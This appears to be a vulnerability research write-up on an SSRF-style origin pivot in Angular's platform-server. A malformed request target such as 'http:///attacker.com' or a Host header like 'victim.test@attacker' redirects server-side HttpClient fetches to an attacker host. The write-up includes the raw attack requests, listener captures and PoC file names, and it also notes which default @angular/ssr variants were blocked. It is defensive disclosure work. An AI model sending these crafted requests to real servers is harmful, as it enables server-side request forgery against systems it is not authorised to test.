# A1 SSR URL Origin Reconstruction: malformed absolute-form request target

Status: `CONFIRMED-COMPILED-ANGULAR-SSR-APP-SSRF / DEFAULT-ANGULAR-SSR-BLOCKED-FOR-TESTED-VARIANTS`

## Summary

Angular's `platform-server` fix covers protocol-relative paths such as:

```text
//attacker.com/deep/path
/\attacker.com/deep/path
```

Those are neutralized as same-origin paths.

A separate malformed absolute-form request target is interesting for direct `platform-server` use:

```text
http:///attacker.com/deep/path
```

Node's HTTP parser accepts this request target and exposes it as `req.url`. Angular's
`parseUrl(urlStr, origin)` then treats it as an absolute URL because `URL.canParse(urlStr)` returns
true. `new URL("http:///attacker.com/deep/path")` normalizes to:

```text
http://attacker.com/deep/path
```

In a temporary real Angular `platform-server` test, adding this URL to the existing "neutralizes
hostname hijack attempts" case failed because `ServerPlatformLocation.hostname` became
`attacker.com`.

## Root Cause

File: `packages/platform-server/src/location.ts`

```ts
export function parseUrl(urlStr: string, origin: string): URL {
  if (URL.canParse(urlStr)) {
    return new URL(urlStr);
  }

  if (urlStr && urlStr[0] !== '/') {
    urlStr = `/${urlStr}`;
  }

  return new URL(origin + urlStr);
}
```

The guard assumes that any URL parseable without a base is intentionally absolute. That is safe for
document-configured absolute URLs, but unsafe when the value is a server request target that should
represent the current request path.

## Why This Matters

`packages/platform-server/src/http.ts` rewrites server-side relative `HttpClient` requests against
the current `PlatformLocation` origin:

```ts
const {href, protocol, hostname, port} = platformLocation;
const baseHref = platformLocation.getBaseHrefFromDOM() || href;
const baseUrl = new URL(baseHref, urlPrefix);
const newUrl = new URL(request.url, baseUrl).toString();
```

If an SSR app passes raw `req.url` into `INITIAL_CONFIG.url`, and the rendered app performs a
server-side relative `HttpClient` request, the malformed request target can pivot the base origin
from the real application host to the attacker host.

There is also a Host-header variant for legacy/direct Express patterns that construct the render URL
as:

```ts
`${protocol}://${headers.host}${originalUrl}`
```

With `Host: victim.test@attacker.test`, that becomes:

```text
http://victim.test@attacker.test/path
```

which has effective origin `http://attacker.test`.

## Current Impact Assessment

This is materially stronger than A4, but the default-path conclusion is nuanced.

Confirmed:

- Node accepts the malformed request target and exposes it as `req.url`.
- Angular `ServerPlatformLocation` treats it as attacker origin.
- Angular's server HTTP interceptor uses `PlatformLocation` origin to rewrite relative requests.
- Node and Express accept Host headers containing `@`.
- Legacy/direct `renderApplication()` URL construction from raw `headers.host` can produce a URL
  whose effective origin is attacker-controlled.
- The Angular integration app's legacy Express pattern is reproducible with real
  Express request fields: `protocol`, `originalUrl`, `baseUrl`, and
  `headers.host`.
- The compiled Angular `integration/platform-server` standalone SSR app is exploitable on macOS:
  its real lazy route performs `HttpClient.get('/api-2')` during SSR and the attacker listener
  receives that server-side request.

Pending:

- Deployment reachability through common frontend proxies/CDNs, because some intermediaries may
  reject or normalize malformed absolute-form request targets before Node sees them.

New evidence 2026-04-29:

- `poc/a1_platform_server_real_network_reduction.mjs`
- `evidence/2026-04-29-platform-server-real-network-reduction.json`
- `poc/a1_node_raw_request_to_platform_server_rewrite.mjs`
- `evidence/2026-04-29-node-raw-request-to-platform-server-rewrite.json`
- `poc/a1_express_legacy_host_userinfo_rewrite.mjs`
- `evidence/2026-04-29-express-legacy-host-userinfo-rewrite.json`
- `poc/a1_macos_compiled_standalone_app_probe.mjs`
- `evidence/2026-04-29-macos-compiled-standalone-app-probe.json`

The raw-request PoC sends:

```text
GET http:///127.0.0.1:<attacker-port>/ssr-entry HTTP/1.1
Host: victim.test
```

Node exposes:

```json
"nodeReqUrl": "http:///127.0.0.1:54744/ssr-entry"
```

The `platform-server` URL logic produces:

```json
"platformLocation": {
  "href": "http://127.0.0.1:54744/ssr-entry",
  "protocol": "http:",
  "hostname": "127.0.0.1",
  "port": "54744"
}
```

The server-side relative `HttpClient` rewrite then produces:

```json
"rewrittenUrl": "http://127.0.0.1:54744/internal-marker"
```

The attacker listener receives:

```json
{"method":"GET","url":"/internal-marker","host":"127.0.0.1:54744"}
```

This is not only a parser discrepancy. It is a real network SSRF chain for direct
or legacy `@angular/platform-server` usage that passes raw `req.url` or an
equivalent request target into `INITIAL_CONFIG.url` and performs relative
server-side `HttpClient` requests during render.

The Express legacy-host evidence uses the same URL construction shape present in
Angular's `integration/platform-server/projects/standalone/server.ts` and
`ngmodule/server.ts`:

```ts
const {protocol, originalUrl, baseUrl, headers} = req;
url: `${protocol}://${headers.host}${originalUrl}`;
```

With:

```text
Host: victim.test@127.0.0.1:<attacker-port>
GET /entry HTTP/1.1
```

Express exposes:

```json
{
  "expressProtocol": "http",
  "expressOriginalUrl": "/entry",
  "expressHostHeader": "victim.test@127.0.0.1:54808",
  "renderUrl": "http://victim.test@127.0.0.1:54808/entry"
}
```

The rewritten server-side relative URL becomes:

```json
"rewrittenUrl": "http://victim.test@127.0.0.1:54808/legacy-marker"
```

and the attacker listener receives:

```json
{"method":"GET","url":"/legacy-marker","host":"127.0.0.1:54808"}
```

The macOS compiled-app probe builds and runs Angular's actual
`integration/platform-server/projects/standalone/server.ts`, whose source uses:

```ts
const {protocol, originalUrl, baseUrl, headers} = req;
url: `${protocol}://${headers.host}${originalUrl}`;
```

The app route `/http-transferstate-lazy` lazy-loads a real Angular component
that calls:

```ts
this.httpClient.get<any>('/api-2')
```

The probe sends the compiled server:

```text
GET /http-transferstate-lazy HTTP/1.1
Host: victim.test@127.0.0.1:<attacker-port>
```

and records:

```json
{
  "responseHead": "HTTP/1.1 200 OK ...",
  "responseContainsAttackerData": true,
  "attackerHits": [
    {
      "method": "GET",
      "url": "/api-2",
      "host": "127.0.0.1:55846",
      "authorization": null,
      "bodyLength": 0
    }
  ]
}
```

This confirms the issue is not only a reduced `platform-server` primitive:
it reaches a real compiled Angular SSR app using the legacy/direct Express
rendering pattern present in Angular's own integration fixture.

Refuted / blocked for tested default path:

- Current `@angular/ssr` Node engine validates `Host` and `X-Forwarded-Host` with
  `VALID_HOST_REGEX`, which rejects `@`.
- Current `@angular/ssr` Node engine constructs a full URL from validated host plus request target
  before rendering; the `http:///attacker` target did not survive this composition as attacker
  origin in the tested cases.
- A deeper modern expansion is documented in
  `evidence/2026-04-28-modern-angular-ssr-deep-expansion.md`. It refuted the tested malformed
  request-target, userinfo Host, protocol-relative, `X-Forwarded-Proto`, and `X-Forwarded-Prefix`
  variants for default modern SSR.

Working severity for legacy/direct `platform-server`: High report candidate,
because it is an SSRF-style origin pivot for server-side `HttpClient`. The
attacker can turn same-app relative SSR fetches into outbound requests to an
attacker-chosen origin reachable from the server process. Practical impact
depends on whether the target SSR app performs relative server-side
`HttpClient` calls and whether fronting infrastructure forwards malformed
absolute-form request targets or raw userinfo Host headers to Node unchanged.

Working severity for current default `@angular/ssr`: not confirmed exploitable for the tested
variants.

## Next Step

Remaining escalation step:

1. Test common deployment front doors: direct Node, Express behind nginx,
   common CDN/proxy behavior.
2. For report submission, present direct `platform-server` as affected and
   current `@angular/ssr` as blocked for the tested variants.
